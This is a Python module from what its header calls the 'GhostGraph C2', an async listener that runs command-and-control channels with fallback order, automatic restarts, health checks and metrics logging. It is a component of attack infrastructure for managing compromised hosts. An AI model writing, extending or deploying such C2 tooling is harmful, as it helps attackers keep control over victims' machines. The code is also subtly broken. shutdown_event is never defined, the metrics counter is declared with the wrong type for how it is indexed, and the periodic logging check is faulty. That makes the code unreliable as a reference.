# server/listener.py
# Async multi-channel listener for GhostGraph C2
# Metrics (prom-like), error resilience (restart with backoff), health checks,
# structured logging, graceful teardown. Integrates config for timeouts/priorities.

import asyncio
from typing import Callable
import time
from collections import defaultdict
import structlog

logger = structlog.get_logger()

# Metrics (in-memory; prod: Prometheus)
_listener_metrics = defaultdict(int)  # channel: {'received': int, 'errors': int}

class MultiListener:
    def __init__(self, channel_manager, callback: Callable, config: dict):
        self.channel_manager = channel_manager
        self.callback = callback
        self.config = config
        self.listeners = {}
        self.health_interval = config.get('health_interval', 60)
        self.restart_backoff = config.get('restart_backoff', 5)
        
    async def start_listening(self):
        """Start async listeners with metrics"""
        for name in self.channel_manager.fallback_order:
            channel = self.channel_manager.create_channel(name, self.config, self.channel_manager.crypto)
            if await channel.init() and await channel.is_available():
                task = asyncio.create_task(self._listen_with_metrics(channel, name))
                self.listeners[name] = {'task': task, 'channel': channel}
                logger.info(f"Started listener for {name}", priority=self.channel_manager.channels[name]['priority'])
            else:
                logger.warning(f"Channel {name} unavailable on startup")
        
        # Health/restart loop
        while not shutdown_event.is_set():
            await self._health_check()
            await asyncio.sleep(self.health_interval)
    
    async def _listen_with_metrics(self, channel, name):
        """Wrapped listen with error handling/metrics"""
        while not shutdown_event.is_set():
            try:
                _listener_metrics[name]['received'] += 1
                await channel.listen(self.callback)
            except Exception as e:
                _listener_metrics[name]['errors'] += 1
                logger.error(f"Listener {name} error", error=e)
                await asyncio.sleep(self.restart_backoff)
                # Re-init channel
                await channel.init()
    
    async def _health_check(self):
        """Health check: Restart failed listeners, log metrics"""
        now = time.time()
        for name, info in list(self.listeners.items()):
            if info['task'].done():
                logger.warning(f"Listener {name} failed, restarting with backoff {self.restart_backoff}s")
                info['task'].cancel()
                try:
                    await info['task']
                except asyncio.CancelledError:
                    pass
                # Re-create
                channel = self.channel_manager.create_channel(name, self.config, self.channel_manager.crypto)
                if await channel.init() and await channel.is_available():
                    new_task = asyncio.create_task(self._listen_with_metrics(channel, name))
                    info['task'] = new_task
                    info['channel'] = channel
                else:
                    logger.error(f"Failed to restart {name}")
            
            # Channel-specific health (e.g., ping if avail)
            if hasattr(info['channel'], 'health_check'):
                healthy = await info['channel'].health_check()
                if not healthy:
                    logger.warning(f"Channel {name} unhealthy")
        
        # Log aggregated metrics
        if now % (self.health_interval * 5) < 1:  # Every 5 checks
            total_received = sum(m.get('received', 0) for m in _listener_metrics.values())
            total_errors = sum(m.get('errors', 0) for m in _listener_metrics.values())
            logger.info("Listener metrics", received=total_received, errors=total_errors)
    
    async def teardown(self):
        """Graceful teardown with metrics flush"""
        for name, info in self.listeners.items():
            info['task'].cancel()
            try:
                await info['task']
            except asyncio.CancelledError:
                pass
            info['channel'].teardown()
        logger.info("Listeners torn down", final_metrics=dict(_listener_metrics))
